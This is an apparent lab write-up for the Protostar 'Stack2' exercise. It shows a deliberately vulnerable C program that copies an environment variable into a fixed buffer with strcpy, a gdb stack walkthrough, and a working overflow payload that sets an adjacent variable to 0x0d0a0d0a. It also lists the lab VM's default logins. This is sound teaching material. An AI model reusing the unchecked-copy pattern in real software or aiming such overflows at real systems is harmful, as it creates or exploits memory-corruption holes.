# Protostar - Stack2
* Getting started
    
    Once the virtual machine has booted, you are able to log in as the “user” account with the password “user” (without the quotes).
    The levels to be exploited can be found in the /opt/protostar/bin directory.
    For debugging the final levels, you can log in as root with password “godmode” (without the quotes)


* Core Files

    README! The /proc/sys/kernel/core_pattern is set to /tmp/core.%s.%e.%p. This means that instead of the general ./core file you get, it will be in a different directory and different file name.


## __Stack2__
* About
  
  Stack2 looks at environment variables, and how they can be set.

  This level is at /opt/protostar/bin/stack2

* Source Code 
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}

```

  This is similar to Stack1 but we have to overflow the "modified" variable with specific value, 0x0d0a0d0a. But now the program will retrieve our input from environment variable call GREENIE so we have to export our GREENIE environment variable to exploit this vulnerability.
```
user@protostar:~$ export GREENIE=$(python -c 'print("A"*64)')
user@protostar:~$ gdb /opt/protostar/bin/stack2
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/stack2...done.
(gdb) disassemble main
Dump of assembler code for function main:
0x08048494 <main+0>:    push   %ebp
0x08048495 <main+1>:    mov    %esp,%ebp
0x08048497 <main+3>:    and    $0xfffffff0,%esp
0x0804849a <main+6>:    sub    $0x60,%esp
0x0804849d <main+9>:    movl   $0x80485e0,(%esp)
0x080484a4 <main+16>:   call   0x804837c <getenv@plt>
0x080484a9 <main+21>:   mov    %eax,0x5c(%esp)
0x080484ad <main+25>:   cmpl   $0x0,0x5c(%esp)
0x080484b2 <main+30>:   jne    0x80484c8 <main+52>
0x080484b4 <main+32>:   movl   $0x80485e8,0x4(%esp)
0x080484bc <main+40>:   movl   $0x1,(%esp)
0x080484c3 <main+47>:   call   0x80483bc <errx@plt>
0x080484c8 <main+52>:   movl   $0x0,0x58(%esp)
0x080484d0 <main+60>:   mov    0x5c(%esp),%eax
0x080484d4 <main+64>:   mov    %eax,0x4(%esp)
0x080484d8 <main+68>:   lea    0x18(%esp),%eax
0x080484dc <main+72>:   mov    %eax,(%esp)
0x080484df <main+75>:   call   0x804839c <strcpy@plt>
0x080484e4 <main+80>:   mov    0x58(%esp),%eax
0x080484e8 <main+84>:   cmp    $0xd0a0d0a,%eax
0x080484ed <main+89>:   jne    0x80484fd <main+105>
0x080484ef <main+91>:   movl   $0x8048618,(%esp)
0x080484f6 <main+98>:   call   0x80483cc <puts@plt>
0x080484fb <main+103>:  jmp    0x8048512 <main+126>
0x080484fd <main+105>:  mov    0x58(%esp),%edx
0x08048501 <main+109>:  mov    $0x8048641,%eax
0x08048506 <main+114>:  mov    %edx,0x4(%esp)
0x0804850a <main+118>:  mov    %eax,(%esp)
0x0804850d <main+121>:  call   0x80483ac <printf@plt>
0x08048512 <main+126>:  leave  
0x08048513 <main+127>:  ret    
End of assembler dump.
(gdb) break *0x080484e8
Breakpoint 1 at 0x80484e8: file stack2/stack2.c, line 22.
(gdb) run
Starting program: /opt/protostar/bin/stack2 

Breakpoint 1, 0x080484e8 in main (argc=1, argv=0xbffff834) at stack2/stack2.c:22
22      stack2/stack2.c: No such file or directory.
        in stack2/stack2.c
(gdb) x/40xw $esp
0xbffff720:     0xbffff738      0xbffff9d3      0xb7fff8f8      0xb7f0186e
0xbffff730:     0xb7fd7ff4      0xb7ec6165      0x41414141      0x41414141
0xbffff740:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff750:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff760:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff770:     0x41414141      0x41414141      0x00000000      0xbffff9d3
0xbffff780:     0x08048530      0x00000000      0xbffff808      0xb7eadc76
0xbffff790:     0x00000001      0xbffff834      0xbffff83c      0xb7fe1848
0xbffff7a0:     0xbffff7f0      0xffffffff      0xb7ffeff4      0x0804829c
0xbffff7b0:     0x00000001      0xbffff7f0      0xb7ff0626      0xb7fffab0
(gdb) 
```

  Above, you will see that we export the GREENIE variable to be 64 "A" then our input has almost overflow "modified" variable so we have to add more character, \x0a\x0d\x0a\x0d to overflow the variable with the correct value.

### _Solution_
```
user@protostar:~$ export GREENIE=$(python -c 'print("A"*64 + "\x0a\x0d\x0a\x0d")')
user@protostar:~$ /opt/protostar/bin/stack2
you have correctly modified the variable
```